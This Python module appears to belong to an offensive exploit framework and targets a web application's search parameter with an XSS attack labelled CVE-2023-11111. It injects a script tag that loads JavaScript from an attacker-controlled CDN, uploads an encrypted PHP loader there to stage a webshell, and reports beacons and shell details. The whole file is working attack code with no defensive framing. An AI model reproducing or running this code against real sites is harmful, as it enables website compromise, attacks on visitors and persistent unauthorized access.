# MINC - CVE-2023-11111 (XSS → JS Dropper → Webshell)

import requests
from random import randint
from modules.cdn_rotator import get_current_cdn_url
from modules.encrypt_module import generate_payload_blob

# Optional modules
try:
    from modules.shell_logger import log_shell_report
except ImportError:
    log_shell_report = None

try:
    from modules.beacon_logic import send_beacon
except ImportError:
    send_beacon = None

XSS_VECTOR_PATH = "/index.php?search="
JS_DROP_PATH = "/static/js/dropper_{}.js"
STAGED_SHELL_NAME = "loader.php"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (AlienDrop/XSSStager)"
}

def run(target, recon_data=None):
    print(f"[CVE-11111] Launching XSS to stage shell...")

    try:
        beacon_id = randint(100000, 999999)
        filename_rand = f"drop_{randint(1000,9999)}.php"
        cdn = get_current_cdn_url()
        staged_url = f"{cdn}/{filename_rand}"

        # --- JS Dropper Payload ---
        js_payload = f"""<script>
            var s = document.createElement('script');
            s.src = '{staged_url}?beacon={beacon_id}';
            document.body.appendChild(s);
        </script>"""

        injection_url = f"http://{target}{XSS_VECTOR_PATH}{js_payload}"
        print(f"[CVE-11111] Injecting JS dropper with beacon ID: {beacon_id}")
        requests.get(injection_url, headers=HEADERS, timeout=5)

        print(f"[CVE-11111] XSS dropper launched at: {injection_url}")

        # --- Encrypted Loader Upload ---
        encrypted_loader = generate_payload_blob(filename_rand, drop_type="php_loader")
        upload_url = f"{cdn}/{filename_rand}"

        print(f"[CVE-11111] Uploading encrypted loader to CDN: {upload_url}")
        upload_response = requests.post(upload_url, data=encrypted_loader, headers=HEADERS, timeout=6)

        if upload_response.status_code not in [200, 201, 204]:
            print(f"[CVE-11111] CDN upload failed ({upload_response.status_code})")
            return False

        # Optional: Ping CDN to ensure availability
        try:
            verify = requests.get(upload_url + f"?check={beacon_id}", timeout=4)
            if verify.status_code != 200:
                print("[CVE-11111] CDN returned non-200 on loader fetch. Proceeding anyway.")
        except Exception:
            print("[CVE-11111] CDN ping failed — may be a stealth cache.")

        # Optional: Beacon logic
        if send_beacon:
            send_beacon(target, method="cve_2023_11111", drop_path=upload_url)

        # Optional: Shell logger
        if log_shell_report:
            shell_id = f"xss_{randint(10000,99999)}"
            tags = ["xss", "cdn", "php_loader"]
            tasks = ["php_loader"]
            metadata = {
                "target": target,
                "dropper": injection_url,
                "cdn": upload_url,
                "beacon": beacon_id
            }
            log_shell_report(shell_id, tags, tasks, metadata)

        return True

    except Exception as e:
        print(f"[CVE-11111] Error during XSS or CDN staging: {e}")
        return False

